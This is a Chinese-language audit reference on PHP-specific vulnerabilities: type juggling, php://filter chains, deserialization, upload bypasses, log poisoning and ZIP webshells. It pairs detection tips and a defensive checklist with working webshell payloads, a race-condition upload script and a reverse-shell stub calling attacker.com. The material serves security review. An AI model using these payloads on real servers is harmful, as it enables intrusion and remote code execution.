# PHP 语言层特有攻击模式

PHP 语言自身的类型系统、内置函数、协议处理器等带来的安全问题。
本文件聚焦 **PHP 语言级别** 的独特安全陷阱，不涉及框架层面（见 `framework_patterns.md`）或通用 Payload（见 `payload_templates.md`）。

---

## Type Juggling（类型杂耍）完整参考表

### `==` vs `===` 比较行为差异

PHP 的 `==`（松散比较）会在比较前进行隐式类型转换，这是大量认证绕过的根源。

#### 松散比较真值表（以下均为 `==` 返回 `true` 的组合）

```
┌────────────────────────────────────────────────────────────────┐
│  表达式                          │  结果   │  原因              │
├────────────────────────────────────────────────────────────────┤
│  0 == "any_string"               │  TRUE   │  字符串转为 int 0  │
│  0 == ""                         │  TRUE   │  空串转为 0        │
│  0 == null                       │  TRUE   │  null 转为 0       │
│  0 == false                      │  TRUE   │  false 转为 0      │
│  "" == null                      │  TRUE   │  均视为空值         │
│  "" == false                     │  TRUE   │  空串视为 falsy     │
│  null == false                   │  TRUE   │  均为空类型         │
│  "0" == false                    │  TRUE   │  "0" 是 falsy      │
│  "0" == null                     │  FALSE  │  注意：这个是 false │
│  "0e123" == "0e456"              │  TRUE   │  均解析为科学计数 0 │
│  "0e123" == 0                    │  TRUE   │  科学计数值为 0     │
│  "1" == "01"                     │  TRUE   │  数值字符串比较     │
│  "1" == "1.0"                    │  TRUE   │  数值字符串比较     │
│  "123" == 123                    │  TRUE   │  字符串转为 int     │
│  1 == "1abc"                     │  TRUE   │  "1abc" 转为 1     │
│  true == "any_nonzero_string"    │  TRUE   │  非空串转为 true    │
│  true == 1                       │  TRUE   │  1 转为 true       │
│  true == -1                      │  TRUE   │  非零转为 true      │
│  true == [1]                     │  TRUE   │  非空数组为 true    │
│  INF == INF                      │  TRUE   │  无穷等于无穷       │
│  "php" == 0                      │  TRUE   │  "php" 转为 0      │
│  "1e1" == "10"                   │  TRUE   │  1e1 = 10          │
└────────────────────────────────────────────────────────────────┘
```

> **PHP 8.0 行为变更**：`0 == "string"` 在 PHP 8.0+ 返回 `FALSE`（non-numeric string 不再转为 0）。
> 但 `"0e123" == "0e456"` 仍为 `TRUE`（两者都是合法的 numeric string）。

#### 原理说明

PHP 松散比较（`==`）遵循复杂的类型转换规则：当比较双方类型不同时，PHP 尝试将其转为共同类型。字符串与整数比较时，字符串被 `intval()` 转换；两个 numeric-looking 字符串比较时，按数值比较。

#### 检测方法

```
在代码中搜索以下模式：
- if ($user_input == $secret)
- if ($token == $stored_token)
- if ($password == $hash)
- switch($input) { case "admin": ... }（switch 使用松散比较）
```

#### Payload 示例

```php
// 场景：认证绕过
// 代码: if ($_GET['password'] == $admin_password)
// 当 $admin_password = "0e123456789" (以 0e 开头的哈希)
// 攻击: ?password=0  → 0 == "0e123456789" → 0 == 0.0 → TRUE

// 场景：JSON 类型绕过
// 代码: if ($_POST['pin'] == "0000")
// 攻击: Content-Type: application/json → {"pin": 0}
// 0 == "0000" → TRUE (int 0 vs string)
```

#### Key Insight 总结

> 所有涉及密码、token、验证码的比较 **必须使用 `===`**。JSON 输入额外危险，因为 `json_decode` 会保留 integer 类型，直接绕过字符串比较。

---

### Magic Hash 列表

以下明文经 MD5/SHA1 哈希后产生 `0e[0-9]+` 格式的结果，在松散比较中均等于 `0`：

#### MD5 Magic Hash

```
┌──────────────────┬──────────────────────────────────────┐
│  明文             │  MD5 哈希值                           │
├──────────────────┼──────────────────────────────────────┤
│  240610708       │  0e462097431906509019562988736854     │
│  QNKCDZO        │  0e830400451993494058024219903391     │
│  aabg7XSs       │  0e087386482136013740957780965295     │
│  aabC9RqS       │  0e041022518165728065344349536617     │
│  s878926199a     │  0e545993274517709034328855841020     │
│  s155964671a     │  0e342768416822451524974117254469     │
│  s214587387a     │  0e848240448830537924465865611904     │
│  s1091221200a    │  0e940624217856561557816327384675     │
│  byGcY           │  0e591948146966052067035298880982     │
└──────────────────┴──────────────────────────────────────┘
```

#### SHA1 Magic Hash

```
┌──────────────────┬──────────────────────────────────────────────┐
│  明文             │  SHA1 哈希值                                  │
├──────────────────┼──────────────────────────────────────────────┤
│  aaroZmOk       │  0e66507019969427134894567494305185566735     │
│  aaK1STfY       │  0e76658526655756207688271159624026011393     │
│  aaO8zKZF       │  0e89257456677279068558073954252716165668     │
│  aa3OFF9m       │  0e36977786278517984959260394024281014729     │
└──────────────────┴──────────────────────────────────────────────┘
```

#### 原理说明

当 `md5($input)` 返回 `0e[0-9]+` 格式字符串时，PHP 将其解释为科学计数法 `0 * 10^N = 0`。两个这样的哈希值松散比较永远相等。

#### 检测方法

```
搜索模式: if (md5($input) == md5($stored))
搜索模式: if (sha1($input) == $hash)
搜索模式: if (hash('md5', $x) == hash('md5', $y))
```

#### Payload 示例

```php
// 代码: if (md5($_GET['pass']) == $stored_md5_hash)
// 若 $stored_md5_hash 恰好以 0e 开头且后跟纯数字
// 攻击: ?pass=240610708 → md5("240610708") = "0e462..." == "0e..." → TRUE
// 或: ?pass=QNKCDZO
```

#### Key Insight 总结

> Magic Hash 攻击需要存储的哈希恰好也是 `0e` 开头。实战中常配合注册功能——注册用户密码为 `240610708`，再用另一个 magic hash 登录其他用户。

---

### strcmp() / in_array() / switch 类型混淆

#### strcmp() 数组绕过

```php
// 漏洞代码
if (!strcmp($_POST['password'], $secret)) {
    // 认证通过
}

// 原理: strcmp(array, string) 返回 NULL (并产生 Warning)
// !NULL === true → 认证绕过
// 攻击: POST password[]=anything
```

#### 原理说明

`strcmp()` 接收非字符串参数时返回 `NULL` 而非 `0` 或非零整数。`!NULL` 在 PHP 中为 `true`，与 `!0`（正常匹配成功的返回值）行为一致。

#### 检测方法

```
搜索模式: if (!strcmp($input, $secret))
搜索模式: if (strcmp($x, $y) == 0)   ← 松散比较 NULL == 0 也为 TRUE
安全写法: if (strcmp($x, $y) === 0)  ← 严格比较
```

#### in_array() 松散比较绕过

```php
// 漏洞代码
$whitelist = [1, 2, 3, 4, 5];
if (in_array($_GET['page'], $whitelist)) {
    include $_GET['page'];  // 危险！
}

// 原理: in_array() 默认使用松散比较
// in_array("1exploit.php", [1,2,3]) → TRUE (因为 "1exploit.php" == 1)
// 攻击: ?page=1exploit.php → 绕过白名单并包含任意文件
```

#### 检测方法

```
搜索: in_array($var, $array) ← 缺少第三个参数 true
安全写法: in_array($var, $array, true)  ← 严格模式
```

#### switch-case 松散比较

```php
// 漏洞代码
switch ($_GET['action']) {
    case 0:
        admin_panel();  // 管理面板
        break;
    case 1:
        user_panel();
        break;
}

// 原理: switch 使用 == 松散比较
// "anything" == 0 → TRUE → 任意字符串匹配 case 0
// 攻击: ?action=anything → 进入 admin_panel()
```

#### Key Insight 总结

> `strcmp()` 传数组返回 NULL；`in_array()` 默认松散比较；`switch` 始终松散比较。三者都是常见的 PHP 认证/授权绕过向量。

---

## php://filter 链完整参考

### 基础用法：源码泄露

#### 原理说明

`php://filter` 是 PHP 的流包装器（stream wrapper），允许在读取资源前对数据施加过滤器。`convert.base64-encode` 将 PHP 文件内容 Base64 编码后输出，防止被当作 PHP 执行。

#### 检测方法

```
搜索存在 LFI 的 include/require：
- include($_GET['file']);
- include($page . '.php');
- require_once($template);
- file_get_contents($user_input);
```

#### Payload 示例

```
# 基础源码读取
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../config/database.php
php://filter/convert.base64-encode/resource=index

# 多过滤器串联
php://filter/string.rot13/resource=config.php
php://filter/convert.base64-encode|convert.base64-encode/resource=config.php

# 写入场景（若存在 file_put_contents + filter）
php://filter/convert.base64-decode/resource=shell.php
# 先 base64 编码 webshell，写入时自动解码
```

### 高级用法：iconv filter chain 构造任意内容

#### 原理说明

PHP 7+ 的 `convert.iconv` 过滤器可以在字符编码转换过程中引入特定字节。通过精心编排多个 iconv 转换链，可以从空内容逐步构造出任意字符串（如 `<?php system($_GET[0]);?>`）。这使得即使目标文件不存在或为空，也能通过 LFI 实现 RCE。

#### 检测方法

```
只要存在 LFI（include/require 可控），即可能利用 iconv chain。
工具: https://github.com/synacktiv/php_filter_chain_generator
```

#### Payload 示例

```
# 使用工具生成（生成 <?php system('id');?> 的 filter chain）
python3 php_filter_chain_generator.py --chain '<?php system("id");?>'

# 输出格式（极长的 filter chain）：
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|...(省略数百个转换)...|
convert.base64-decode/resource=php://temp
```

#### Key Insight 总结

> php://filter 是 LFI 的瑞士军刀。基础用法泄露源码，高级 iconv chain 可实现无文件 RCE。审计时发现任何 `include` 参数可控，即应标记为高危。

---

### 常见 LFI 目标路径列表

```
# Linux 系统文件
/etc/passwd
/etc/shadow                          # 需 root 权限
/etc/hosts
/proc/self/environ                   # 环境变量，含 User-Agent（可投毒）
/proc/self/cmdline                   # 进程命令行
/proc/self/fd/[0-9]                  # 打开的文件描述符
/proc/self/status                    # 进程信息

# Web 服务器日志（Log Poisoning 目标）
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log            # CentOS/RHEL

# PHP 配置与会话
/etc/php.ini
/etc/php/7.4/fpm/php.ini
/tmp/sess_<PHPSESSID>                # PHP Session 文件
/var/lib/php/sessions/sess_<ID>      # Debian/Ubuntu session 路径

# 应用配置文件
.env                                 # Laravel/通用环境配置
config.php
wp-config.php                        # WordPress
configuration.php                    # Joomla
settings.php                         # Drupal
```

### Null Byte 截断（PHP < 5.3.4）

#### 原理说明

PHP 5.3.4 之前，底层 C 函数使用 `\0`（null byte）作为字符串终止符。攻击者可以在文件路径中注入 `%00` 来截断后缀。

#### Payload 示例

```php
// 代码: include($_GET['page'] . '.php');
// 攻击 (PHP < 5.3.4): ?page=../../../etc/passwd%00
// 效果: include("../../../etc/passwd\0.php") → 实际读取 /etc/passwd

// 代码: include($_GET['lang'] . '/header.tpl');
// 攻击: ?lang=php://filter/convert.base64-encode/resource=config.php%00
```

#### Key Insight 总结

> Null byte 截断仅在 PHP < 5.3.4 有效，现代 PHP 已修复。但老系统仍然大量存在，审计时需确认 PHP 版本。

---

## PHP 反序列化 Cookie/Session 模式

### 标准序列化格式解析

```
类型标记:
  b:1;                              → boolean true
  i:42;                             → integer 42
  d:3.14;                           → double 3.14
  s:5:"hello";                      → string "hello" (长度:5)
  a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}  → array ["foo", "bar"]
  O:8:"ClassName":1:{s:4:"prop";s:5:"value";}  → 对象

属性可见性编码:
  s:4:"name"          → public $name
  s:14:"\0ClassName\0name"  → private $name (\0 是 null byte)
  s:7:"\0*\0name"     → protected $name
```

#### 原理说明

PHP `unserialize()` 会自动调用对象的魔术方法（`__wakeup`, `__destruct`, `__toString` 等）。攻击者构造恶意序列化数据，利用已有类的魔术方法链（POP chain）实现任意代码执行。

#### 检测方法

```
直接危险函数:
- unserialize($_GET/POST/COOKIE/REQUEST[...])
- unserialize(base64_decode($input))
- unserialize(gzuncompress($input))

间接触发:
- phar:// 协议触发（见下方）
- session.serialize_handler 不一致
```

#### Payload 示例

```php
// 基础 POC
O:8:"FilePath":1:{s:4:"path";s:11:"/etc/passwd";}

// __wakeup 绕过 (CVE-2016-7124, PHP 5 < 5.6.25, PHP 7 < 7.0.10)
// 原理: 声明的属性数 > 实际属性数 → __wakeup 不被调用
// 原始: O:4:"Test":1:{s:4:"data";s:4:"safe";}
// 绕过: O:4:"Test":2:{s:4:"data";s:7:"exploit";}  ← 属性数改为 2
```

### Phar 反序列化触发

#### 原理说明

Phar（PHP Archive）文件的 metadata 部分以 PHP 序列化格式存储。任何对 `phar://` 路径执行文件操作的函数都会自动反序列化 metadata，无需显式调用 `unserialize()`。

#### 可触发 Phar 反序列化的函数

```
文件信息类:    file_exists(), is_file(), is_dir(), is_link(), is_writable()
              file(), fileatime(), filectime(), filemtime(), filesize()
              filegroup(), fileinode(), fileowner(), fileperms(), filetype()
文件操作类:    fopen(), copy(), rename(), unlink(), stat(), lstat()
              readfile(), file_get_contents(), file_put_contents()
目录操作类:    opendir(), scandir(), glob()
图像处理类:    getimagesize(), exif_read_data()
哈希计算类:    md5_file(), sha1_file(), hash_file()
配置解析类:    parse_ini_file()
```

#### Payload 示例

```php
// 步骤1: 生成恶意 Phar 文件
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$exploit = new VulnerableClass();
$exploit->cmd = 'id';
$phar->setMetadata($exploit);
$phar->stopBuffering();

// 步骤2: 将 evil.phar 重命名为 evil.jpg 上传（绕过扩展名检查）
// 步骤3: 触发反序列化
// file_exists('phar://uploads/evil.jpg/test.txt') → 触发 unserialize(metadata)
```

### 常见 POP Chain 模式

```
┌─────────────┬──────────────────────────────────────────────────────┐
│  框架        │  POP Chain 入口                                      │
├─────────────┼──────────────────────────────────────────────────────┤
│  Laravel     │  PendingBroadcast → __destruct → Dispatcher         │
│             │  → dispatch() → call_user_func()                    │
│             │  工具: phpggc Laravel/RCE1~RCE10                      │
├─────────────┼──────────────────────────────────────────────────────┤
│  Symfony     │  Process → __destruct → 执行 proc_open()            │
│             │  工具: phpggc Symfony/RCE1~RCE4                       │
├─────────────┼──────────────────────────────────────────────────────┤
│  Yii2        │  BatchQueryResult → __destruct → close()            │
│             │  → DataReader → close() → call_user_func()          │
├─────────────┼──────────────────────────────────────────────────────┤
│  ThinkPHP    │  Windows → __destruct → removeFiles()               │
│             │  → file_exists() → Phar 二次反序列化                  │
│             │  工具: phpggc ThinkPHP/RCE1~RCE2                      │
├─────────────┼──────────────────────────────────────────────────────┤
│  Monolog     │  BufferHandler → __destruct → close()               │
│             │  → handle() → StreamHandler → write()               │
│             │  → file_put_contents() 写 webshell                   │
├─────────────┼──────────────────────────────────────────────────────┤
│  Guzzle      │  FileCookieJar → __destruct → save()                │
│             │  → file_put_contents() 写 webshell                   │
└─────────────┴──────────────────────────────────────────────────────┘

# 通用 POP Chain 生成工具
phpggc <Framework/Type> <payload>
# 例: phpggc Laravel/RCE6 'system' 'id'
```

#### Key Insight 总结

> PHP 反序列化不仅限于 `unserialize()` 调用。Phar 协议使得任何文件操作函数都可能成为反序列化入口。审计时搜索所有可控的文件路径参数 + phar:// 协议的可达性。

---

## basename() / 路径处理函数陷阱

### basename() 隐患

#### 原理说明

`basename()` 提取路径的最后一个组件，但它 **不会过滤** 隐藏文件（`.` 开头）和备份文件（`~` 结尾）。更重要的是，`basename()` 对某些多字节字符会产生意外截断。

#### 检测方法

```
搜索: basename($path) 用于安全检查
搜索: 仅依赖 basename() 进行文件名白名单验证
```

#### Payload 示例

```php
// 场景: 仅允许访问特定目录的文件
$file = basename($_GET['file']);
include("/safe/dir/" . $file);

// 攻击1: ?file=.htaccess → 读取 .htaccess 配置
// 攻击2: ?file=config.php.bak → 读取备份文件（可能含明文密码）

// basename() 多字节截断（locale 依赖）
setlocale(LC_ALL, "C");  // ASCII locale
basename("/path/to/\xff/etc/passwd");
// 某些 locale 下可能返回意外结果
```

### realpath() 空返回处理

#### 原理说明

`realpath()` 在文件不存在时返回 `false`。如果代码未检查返回值，可能导致路径验证绕过。

#### Payload 示例

```php
// 漏洞代码
$path = realpath($_GET['file']);
if (strpos($path, '/safe/dir/') === 0) {
    readfile($path);
}

// 攻击: 当文件不存在时 realpath() 返回 false
// strpos(false, '/safe/dir/') === false
// false === 0 → FALSE → 但如果用了 == 而不是 ===
// strpos(false, ...) == 0 → 注意 strpos 返回值的比较陷阱
```

### pathinfo() 扩展名绕过

#### 原理说明

`pathinfo()` 取最后一个 `.` 后的内容作为扩展名。双扩展名、特殊字符可以绕过基于 `pathinfo()` 的扩展名检查。

#### Payload 示例

```php
// 代码: $ext = pathinfo($filename, PATHINFO_EXTENSION);
// if ($ext !== 'php') { /* 允许上传 */ }

pathinfo('shell.php.jpg', PATHINFO_EXTENSION);   // → "jpg" (绕过检查)
// 但 Apache 可能按 .php 解析（双扩展名解析漏洞）

pathinfo('shell.PHP', PATHINFO_EXTENSION);        // → "PHP"
// 大小写不敏感匹配时可绕过黑名单

pathinfo('shell.php.', PATHINFO_EXTENSION);       // → "" (空字符串)
// Windows 下文件名末尾的 . 会被自动去除 → 实际存储为 shell.php

pathinfo('.htaccess', PATHINFO_EXTENSION);        // → "htaccess"
// PATHINFO_FILENAME 返回 "" → 可能绕过文件名非空检查
```

#### Key Insight 总结

> 路径处理函数各有边界条件。安全审计时，不应依赖单一函数做路径安全验证。推荐组合使用 `realpath()` + 目录前缀检查 + 白名单扩展名 + `===` 严格比较。

---

## PHP 特有文件上传绕过

### .htaccess 上传 RCE

#### 原理说明

如果可以上传 `.htaccess` 文件到 Apache 服务器可解析的目录，就能重新定义文件解析规则，使任意扩展名被当作 PHP 执行。

#### 检测方法

```
条件:
1. Apache + mod_php 或 Apache + php-fpm (且 AllowOverride 启用)
2. 上传目录可被 Web 访问
3. 未限制 .htaccess 文件上传
```

#### Payload 示例

```apache
# .htaccess 内容方案1：自定义扩展名
AddType application/x-httpd-php .xxx
# 然后上传 shell.xxx，内容为 <?php system($_GET['cmd']); ?>

# .htaccess 内容方案2：所有文件当 PHP 解析
SetHandler application/x-httpd-php
# 然后上传任意文件名的 webshell

# .htaccess 内容方案3：自动 prepend
php_value auto_prepend_file "uploads/shell.jpg"
# 使每个 PHP 请求都先 include shell.jpg

# .htaccess 内容方案4：开启 PHP 短标签
php_flag short_open_tag On
# 然后上传包含 <?= system('id'); ?> 的文件
```

### 扩展名绕过列表

```
可被 PHP 解析的扩展名（取决于服务器配置）:
  .php    - 标准
  .phtml  - 常见备选
  .php3   - PHP 3 遗留
  .php4   - PHP 4 遗留
  .php5   - PHP 5 特有
  .php7   - PHP 7 特有
  .phar   - PHP Archive
  .phps   - PHP 源码显示（部分配置下可执行）
  .pht    - 部分系统支持
  .pgif   - 极少见但存在

大小写变体:
  .pHp, .PhP, .PHP, .pHP 等（Windows / 部分 Linux 配置）

双扩展名利用 (Apache 配置缺陷):
  shell.php.jpg    → Apache 某些配置下按 .php 解析
  shell.php.xxxxx  → 未知扩展名 fallback 到前一个
```

### getimagesize() 绕过（图片马）

#### 原理说明

`getimagesize()` 只验证文件头部的图像 magic bytes，不检查文件后续内容。攻击者可以在合法图片头后追加 PHP 代码。

#### Payload 示例

```bash
# 方法1: GIF 文件头 + PHP 代码
echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# 方法2: 在真实 JPEG 的 EXIF 注释中嵌入 PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg

# 方法3: 在 PNG 的 IDAT chunk 中嵌入 PHP
# 使用工具: https://github.com/huntergregal/PNG-IDAT-Payload-Generator

# 方法4: 在 BMP 文件颜色表数据中嵌入
# 前14字节为 BMP header，随后可注入 PHP 代码
```

### move_uploaded_file() 竞态条件

#### 原理说明

在"上传 → 检查 → 删除/移动"的流程中，文件在临时位置和最终位置之间存在时间窗口。攻击者可以利用竞态条件在检查完成前访问恶意文件。

#### Payload 示例

```python
# 竞态条件利用脚本思路
# 线程A: 持续上传 webshell
# 线程B: 持续请求 webshell URL
# 窗口: 文件被 move_uploaded_file() 移到目标目录后、安全检查删除前

import threading
import requests

def upload():
    while True:
        requests.post(url, files={'file': ('shell.php', '<?php system("id");?>')})

def access():
    while True:
        r = requests.get(target_url + '/uploads/shell.php')
        if 'uid=' in r.text:
            print("[+] RCE Success:", r.text)
            break
```

#### Key Insight 总结

> 文件上传防御需要多层：扩展名白名单 + MIME 检查 + 文件内容检查 + 随机化文件名 + 上传目录禁止执行 PHP + 禁止 .htaccess 上传。

---

## Log Poisoning RCE 模式

### User-Agent 注入 + LFI

#### 原理说明

Web 服务器将 HTTP 请求头（User-Agent、Referer 等）写入访问日志。如果存在 LFI 漏洞可以包含日志文件，攻击者可以通过注入 PHP 代码到请求头实现 RCE。

#### 检测方法

```
条件:
1. 存在 LFI 漏洞 (include/require 参数可控)
2. PHP 进程有权读取 Web 服务器日志
3. 日志路径可预测
```

#### Payload 示例

```
# 步骤1: 向日志注入 PHP 代码
curl -A '<?php system($_GET["cmd"]); ?>' http://target/any-page

# 步骤2: 通过 LFI 包含日志文件
http://target/vuln.php?page=/var/log/apache2/access.log&cmd=id
http://target/vuln.php?page=/var/log/nginx/access.log&cmd=id

# 注意: 如果注入失败（日志被截断），可以尝试短 payload
curl -A '<?=`$_GET[1]`?>' http://target/
# 短标签 + 反引号执行，只有19个字符
```

### /proc/self/environ 注入

#### 原理说明

`/proc/self/environ` 包含当前进程的环境变量，其中 `HTTP_USER_AGENT` 等来自 HTTP 请求。CGI/FastCGI 模式下可直接包含此文件实现 RCE。

#### Payload 示例

```
# 步骤1: 设置 User-Agent 为 PHP 代码
# 步骤2: LFI 包含 /proc/self/environ
http://target/vuln.php?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

### PHP Session 文件注入

#### 原理说明

PHP 将 session 数据存储在文件系统（默认 `/tmp/sess_<PHPSESSID>` 或 `/var/lib/php/sessions/sess_<ID>`）。如果应用将用户输入存入 session，攻击者可以注入 PHP 代码到 session 文件，再通过 LFI 包含执行。

#### Payload 示例

```php
// 步骤1: 应用将用户名存入 session
// $_SESSION['username'] = $_POST['username'];

// 步骤2: 注册用户名为 PHP 代码
// POST username=<?php system('id'); ?>

// 步骤3: LFI 包含 session 文件
// http://target/vuln.php?page=/tmp/sess_abc123def456
// 其中 abc123def456 是 PHPSESSID cookie 值

// Session 文件内容示例:
// username|s:26:"<?php system('id'); ?>";
```

#### Key Insight 总结

> Log Poisoning 是 LFI 升级为 RCE 的经典路径。防御要点：LFI 修复是根本，日志目录权限隔离是纵深防御。

---

## ZIP 上传 Webshell 模式

### ZIP 解压 Webshell 植入

#### 原理说明

如果应用接受 ZIP 上传并解压到 Web 可访问目录，攻击者可以在 ZIP 中放置 PHP webshell。即使应用检查了上传文件的扩展名是 `.zip`，解压后的内容可能包含 `.php` 文件。

#### 检测方法

```
搜索: ZipArchive::extractTo()
搜索: zip_open() + zip_read()
搜索: shell_exec('unzip ...')
确认: 解压目标目录是否 Web 可访问 + 是否检查了内部文件名
```

#### Payload 示例

```bash
# 创建含 webshell 的 ZIP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip evil.zip shell.php
# 上传 evil.zip → 解压后 shell.php 出现在 Web 目录

# 含路径穿越的 ZIP（ZipSlip）
python3 -c "
import zipfile
z = zipfile.ZipFile('zipslip.zip', 'w')
z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
z.close()
"
# 解压时可能将文件写到上层目录
```

### system() 被禁用时的替代方案

#### 原理说明

`disable_functions` 配置可以禁用危险函数。但 PHP 有大量可以读取文件或执行代码的替代函数。

#### Payload 示例

```php
// 当 system/exec/shell_exec/passthru/popen 被禁用时:

// 文件读取替代
echo file_get_contents('/etc/passwd');
readfile('/flag.txt');
show_source('/flag.txt');         // 等同于 highlight_file()
print_r(file('/etc/passwd'));     // 按行读取为数组
$f = fopen('/etc/passwd','r'); echo fread($f, filesize('/etc/passwd'));

// 命令执行替代
$proc = proc_open('id', [1=>['pipe','w']], $pipes); echo stream_get_contents($pipes[1]);
echo `id`;                        // 反引号（本质是 shell_exec）
pcntl_exec('/bin/sh', ['-c', 'id']);  // 需要 pcntl 扩展
$sock = fsockopen('attacker.com', 4444); // 反弹 shell

// mail() 函数利用 (通过 -X 参数写日志)
mail('','','','','-OQueueDirectory=/tmp -X/var/www/html/shell.php');

// putenv() + mail() LD_PRELOAD 劫持
putenv('LD_PRELOAD=/tmp/evil.so');
mail('','','','');  // 触发 sendmail → 加载 evil.so

// FFI (PHP 7.4+, 需开启)
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system("id");

// imap_open() 利用 (需 imap 扩展)
imap_open('{attacker.com:993/imap/ssl}INBOX', '', '', 0, 1, [
    'DISABLE_AUTHENTICATOR' => 'GSSAPI'
]);
// 某些版本可通过 mailbox 参数注入命令
```

### Symlink in ZIP（ZipSlip 变体）

#### 原理说明

ZIP 文件可以包含符号链接。如果解压时未检查 symlink，攻击者可以创建指向敏感文件的符号链接，再通过 Web 访问读取。

#### Payload 示例

```bash
# 创建含符号链接的 ZIP
ln -s /etc/passwd passwd_link
zip --symlinks evil.zip passwd_link
# 上传并解压后，访问 passwd_link 即读取 /etc/passwd

# 两步攻击（绕过更多检查）
# 步骤1: 上传含 symlink 指向 / 的 ZIP
ln -s / root_link
zip --symlinks step1.zip root_link

# 步骤2: 上传含路径 root_link/etc/passwd 的 ZIP
# 解压后通过 symlink 读取任意文件
```

#### Key Insight 总结

> ZIP 上传是一个被低估的攻击面。防御需要：解压前检查内部文件名（禁止 `..`）、禁止 symlink、限制解压目标目录、解压后扫描文件扩展名。`disable_functions` 不是银弹——PHP 的替代执行/读取方法极其丰富。

---

## 附录：审计 Checklist 速查

```
□ 所有比较操作是否使用 === 而非 ==
□ in_array() 是否传入第三参数 true
□ strcmp() 返回值是否用 === 0 判断
□ include/require 路径是否可控
□ unserialize() 是否接受外部输入
□ 文件操作函数是否可能接受 phar:// 协议
□ 上传功能是否检查了 .htaccess 和双扩展名
□ ZIP 解压是否验证了内部文件路径和类型
□ disable_functions 列表是否完整（是否遗漏了替代函数）
□ session / 日志 路径是否可被 LFI 包含
□ basename() / pathinfo() 是否作为唯一安全检查
□ realpath() 返回 false 时是否正确处理
```
